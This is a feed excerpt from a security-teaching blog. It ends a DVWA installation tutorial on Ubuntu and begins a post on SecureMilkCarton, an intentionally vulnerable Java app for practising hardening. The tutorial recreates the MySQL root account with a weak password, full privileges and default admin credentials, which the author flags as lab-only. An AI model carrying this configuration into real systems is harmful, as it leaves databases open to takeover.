    style=&quot;padding-bottom: 62.0253164556962%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABrElEQVQoz4VTa3PaMBDk//8oZppAoa8J5VFCKAWbxJZt+SXLMjRMN3fnmpDp0HzYudPptN49yb2qqmCtRVmWKIqC0MUCJeVtvY3cx/1VZa+ixw11XcP3fQwGA4xGY3wajzG4vcVwOES/38fNhxvsdp70tQKuo3epUOsUaZoiy3JoioxEa6prUfk/ZRcKrTBzNJYUEEzVxhZOYGi/NO+j182F43W0Y3GuRk1rzqXO584jsG8tF2Q5zwuxm9OFdOB1IePQiKK4HQflvMdnDcOYsyghdM4hDAN8+XaHH8t7LFcPmC8Wkj+s1/g+nWFC2PkeAqUo+tBZht+nE47Pz6ibBubvKzgrzPIM+8cnRHEMFTEiKBXJ2vM8xInG4XiEOzRoDgeB5Vuva1FZkco3hHy7TPRIpB4pCEJ1Jo+TRPKnIKB6KPD8PdI8F9KSyMwlYUOSfbIzGn/G8OMId5MJpvMFpmRzvdliNptjs91hQvUFjeF+tcJXGo+KE5zw51/Ljr6iVEjNS8yIaEsWf25+0az2ZLG1Zh0/HyuxAxPxvtjuFL7+Tq9Pp1u/B3OB7vwLje6Jg3TuWFUAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Error loading the DVWA database&quot;
        title=&quot;Error loading the DVWA database&quot;
        src=&quot;/static/2ab8f38a8a8e14f6a82e62ac8bdd078e/2cb6c/database-issue.png&quot;
        srcset=&quot;/static/2ab8f38a8a8e14f6a82e62ac8bdd078e/c26ae/database-issue.png 158w,
/static/2ab8f38a8a8e14f6a82e62ac8bdd078e/6bdcf/database-issue.png 315w,
/static/2ab8f38a8a8e14f6a82e62ac8bdd078e/2cb6c/database-issue.png 395w&quot;
        sizes=&quot;(max-width: 395px) 100vw, 395px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;re-configure-mysql-root-account&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#re-configure-mysql-root-account&quot; aria-label=&quot;re configure mysql root account permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Re-configure MySQL root account&lt;/h2&gt;
&lt;p&gt;Unfortunately, the root account will not work with DVWA due to the way MySQL is built in version 5.7. If you are using an older version than 5.7, this step will not apply. You can test the database install using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;mysql -uroot -p&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you are able to login with the password: &lt;code class=&quot;language-text&quot;&gt;p@ssw0rd&lt;/code&gt;, everything should be working fine. However, if you cannot, you will need to fix the access for the root account. Apparently, &lt;a href=&quot;https://zenidas.wordpress.com/recipes/mysql-5-7-root-login-without-sudo/&quot;&gt;MySQL 5.7 changed the security model&lt;/a&gt;, so that root login requires sudo. We will fix this issue, and re-create the root account and specify the permissions we desire. The following steps are not recommended for deploying a web application, as we should lock down the database and not use the root account. However, we are installing an intentionally vulnerable web application… hopefully, in a testing environment!&lt;/p&gt;
&lt;p&gt;Start by logging into the MySQL command prompt:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo mysql -uroot&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since there is no password configured by default, you should not be prompted to enter a password. Start by removing the root user from the MySQL table of users:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;DROP&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;@&apos;localhost&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
Query OK&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;rows&lt;/span&gt; affected &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0.00&lt;/span&gt; sec&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now create the root user again:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;@&apos;localhost&apos;&lt;/span&gt; IDENTIFIED &lt;span class=&quot;token keyword&quot;&gt;BY&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;p@ssw0rd&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
Query OK&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;rows&lt;/span&gt; affected &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0.00&lt;/span&gt; sec&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Specify that the root user should have permission to access anything!&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;GRANT&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;ALL&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;PRIVILEGES&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;TO&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;@&apos;localhost&apos;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;GRANT&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;OPTION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
Query OK&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;rows&lt;/span&gt; affected &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0.00&lt;/span&gt; sec&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ask MySQL to reload all configuration and permissions:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; FLUSH &lt;span class=&quot;token keyword&quot;&gt;PRIVILEGES&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
Query OK&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;rows&lt;/span&gt; affected &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0.00&lt;/span&gt; sec&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now exit the MySQL prompt:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;mysql&gt; exit
Bye&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It is recommended that you check that the problem has been resolved. Try to login to the MySQL prompt again, this time using the same username and password that DVWA uses:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;mysql -uroot -pp@ssw0rd&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once again, you should have entered the MySQL prompt. Remember, you can leave this prompt by using the &lt;code class=&quot;language-text&quot;&gt;exit&lt;/code&gt; command. If this works, we have finished the MySQL configuration and can head back to DVWA to create the database.&lt;/p&gt;
&lt;h2 id=&quot;creating-the-dvwa-database&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#creating-the-dvwa-database&quot; aria-label=&quot;creating the dvwa database permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Creating the DVWA Database&lt;/h2&gt;
&lt;p&gt;Head back to your web browser and try to create the database again. This time, we should be successful and see the following output:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 439px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/bc63d24e63128c123f4888d031a067a4/e3b18/database-working.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 98.10126582278481%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACH0lEQVQ4y5VUa3PaMBDk//8tEqbtTPOlSRMS0vopP8DYlgzm0Znt7RkzQGNCP+ycdCOv9u7WGjVNA+cc6rpGbS2qqtJ1VdUareSI/pxzzVWMeNDaGk+Pj5jc3+Ph+wMmkwm+ffmKu7sxxuMxjDFYr9dK2DTXMepvLkVRUSyxLCsUyxJLAeNCclVt9XZ7A0ZkvTzsjnF1M9EJYaeQJW3aViPRtowria3Grn//4sOSrbPwPA9v77/gB6EggOcHMEmCd8nFJsGq3aBZrdDIZT2c7C8HdiB0yPMcJk2RZbmuM8F8sUAiOUZ7OHeKmvGEkPFYcpplSkhlYRQjkb0fhohig+1uh/VmIyrbI9aMonKQkEpSUcfIUrnmJQTVluJP94HKQcIoioQsk34ZRZbPD8SZKi7KslMpqhSisBlSyKGYxOC358vHEcIw1OEwF8axtMHHUnyqCk8xpJDJRNSYJNXyUilbh1Esjkpr67qe3VpyIIpi+ZClB2FXPu0TCCJpged7ekm73X4+FCZplXy+UIXdeq4W4n+sw0k79XxAaBeNFw/HmcLnlxc8T6d4+vmM17cZfshjwT37ylYEkfRV1LN32/0eG7ES1Q4ScrKhltt5L+YwpFw+DGem7tdXh6KEsZqafSTx62ym+ba3Sm/qW2zDDXvFIagPRR1JB81805SlVJ1uNUXmZtjt/4iR27Pf7b9+PXt4/su6UPRP/2foifr4F1j07k8TnWJFAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Loading the DVWA database&quot;
        title=&quot;Loading the DVWA database&quot;
        src=&quot;/static/bc63d24e63128c123f4888d031a067a4/e3b18/database-working.png&quot;
        srcset=&quot;/static/bc63d24e63128c123f4888d031a067a4/c26ae/database-working.png 158w,
/static/bc63d24e63128c123f4888d031a067a4/6bdcf/database-working.png 315w,
/static/bc63d24e63128c123f4888d031a067a4/e3b18/database-working.png 439w&quot;
        sizes=&quot;(max-width: 439px) 100vw, 439px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;If the database is created successfully, you will be redirected to the login screen:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/7e3ca614620971a949404978ec356c77/2c288/login-page.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 65.18987341772153%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABYklEQVQ4y41TW0vDMBjt//8Pgg9e0AfRFxGrYwyGoIgXEAQf1G6y0m7rPVuTtMd8qe26WEYTPnq+S07Ol6RWuAww/5nB8+fwPA++7yMIA2QZA+cceZ5vbMuvMNUwxjCZTNV6HxYXKrFeY51vG8VlISGEgJBCY66wlKjikuJS+VLX5jzXZpWg2T3aGVlKMOHi+X2kieu8Oa2iLGAaDdptMBzBvh3i+OQMe/sHGN/d42s+RLoKdE3XWsvcoSakth+fXnA9sHF4eoQr28bF5TnGDze63br2n8I2Uf2tcNE0PgtekfBvfHy+YaousK3OJLZMde1zK9S5FWXlk6pNvCbooZBuMIojpFnaqKBYhWULmx3tIIzjWFuWZZ1Gm7EV293yhlBgsVwolbF+X/px/70xwrVPuV6EdFZhGCKKVNtpiiRJGmWEmxjL+hG2v9Q+Ddd14ThOFS+2312vWzZn/Wt15cw1v8Jk9gVdbz+fAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;DVWA login screen&quot;
        title=&quot;DVWA login screen&quot;
        src=&quot;/static/7e3ca614620971a949404978ec356c77/f058b/login-page.png&quot;
        srcset=&quot;/static/7e3ca614620971a949404978ec356c77/c26ae/login-page.png 158w,
/static/7e3ca614620971a949404978ec356c77/6bdcf/login-page.png 315w,
/static/7e3ca614620971a949404978ec356c77/f058b/login-page.png 630w,
/static/7e3ca614620971a949404978ec356c77/2c288/login-page.png 684w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The following credentials can be used to login to DVWA:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;username: &lt;code class=&quot;language-text&quot;&gt;admin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;password: &lt;code class=&quot;language-text&quot;&gt;password&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This tutorial summarized how to install and configure Damn Vulnerable Web Application, or DVWA, on Ubuntu Linux version 18.04. Although the tutorial instructions are specific to Ubuntu Linux (Desktop or Server), the tutorial should provide suitable discussion and advice for other Linux distributions, such as Kali Linux. I hope that the tutorial helped someone, and, as always, please leave a comment if you have any questions or feedback. Also, if you are interested in a tutorial about completing any of the DVWA exercises, please leave a comment - I could also be interested in documenting the methods used in each exercise. Thanks!&lt;/p&gt;</content:encoded></item><item><title><![CDATA[SecureMilkCarton - A Vulnerable Web App]]></title><description><![CDATA[This post documents a security project I have written, SecureMilkCarton - an intentionally vulnerable Java web application that runs on…]]></description><link>https://thomaslaurenson.com/blog/2018-07-14/SecureMilkCarton-a-vulnerable-web-app/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-14/SecureMilkCarton-a-vulnerable-web-app/</guid><pubDate>Thu, 12 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post documents a security project I have written, SecureMilkCarton - an intentionally vulnerable Java web application that runs on Apache Tomcat. &lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#project-background&quot;&gt;Project Background&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#project-repository&quot;&gt;Project Repository&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#project-exercises-and-answers&quot;&gt;Project Exercises and Answers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#securemilkcarton-quick-start&quot;&gt;SecureMilkCarton: Quick Start&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#option-1-build-script&quot;&gt;Option 1: Build Script&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#option-2-docker&quot;&gt;Option 2: Docker&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#securemilkcarton-installation-using-build-script&quot;&gt;SecureMilkCarton: Installation using Build Script&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#optional-install-better-history&quot;&gt;Optional: Install better history&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#optional-changing-the-default-ports&quot;&gt;Optional: Changing the default ports&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#securemilkcarton-web-server-configuration&quot;&gt;SecureMilkCarton: Web Server Configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#securemilkcarton-project-structure&quot;&gt;SecureMilkCarton: Project Structure&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#securemilkcarton-general-usage&quot;&gt;SecureMilkCarton: General Usage&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#how-to-create-the-database&quot;&gt;How to create the database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-to-delete-and-recreate-the-database&quot;&gt;How to delete and recreate the database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-to-compile-and-deploy&quot;&gt;How to compile and deploy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-to-access-the-web-application&quot;&gt;How to access the web application&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;It seems vulnerable web applications for learning &lt;em&gt;hacking&lt;/em&gt; or &lt;em&gt;penetration testing&lt;/em&gt; are a dime-a-dozen. SecureMilkCarton is different, it has been specifically designed to learn &lt;em&gt;how to secure a poorly written web application&lt;/em&gt; and &lt;em&gt;how to secure a web server&lt;/em&gt;. &lt;/p&gt;
&lt;p&gt;The web application itself is riddled with security issues, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Vulnerable to SQL injection attacks&lt;/li&gt;
&lt;li&gt;Vulnerable to XSS attacks&lt;/li&gt;
&lt;li&gt;Access control issues&lt;/li&gt;
&lt;li&gt;Bad password storage practices&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To add to the problem, the web server used to host the web application also suffers from a collection of security issues, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Non-existent firewall&lt;/li&gt;
&lt;li&gt;Poorly configured MySQL database&lt;/li&gt;
&lt;li&gt;No HTTPS configured&lt;/li&gt;
&lt;li&gt;Default SSH configuration&lt;/li&gt;
&lt;li&gt;Bad practice implementing security-related HTTP headers&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;project-background&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#project-background&quot; aria-label=&quot;project background permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Project Background&lt;/h2&gt;
&lt;p&gt;SecureMilkCarton is written in Java and deployed on Apache Tomcat. I am by no means a Java expert or a Java fan - not a hater, just have never really written in it… So why write it in Java? Well, the web application is the resultant product of a practical assessment I developed for the &lt;em&gt;Introduction to Information Security&lt;/em&gt; course that I teach. This course is situated in the same semester that students are taking the Programming 3 paper in, you guessed it, the Java programming language. It has a MySQL database for user authentication and web application data storage. Again, SQL was chosen as students are also taking a Databases 2 paper which covers relational databases. So, the applications used to seem like a good fit for the degree.&lt;/p&gt;
&lt;p&gt;Since SecureMilkCarton was specifically designed for my &lt;em&gt;Introduction to Information Security&lt;/em&gt; course, it targets the level of the paper. This course is situated in the second year of a Bachelor of Information Technology degree. It is the first security-related paper students have taken, and only have 1 year of experience in the IT field. So it targets that general level. However, students do have a collection of practical labs and worksheets that guide them through the general framework of performing a security audit. Additionally, the assessment could easily be scaled up or down depending on specific requirements.&lt;/p&gt;
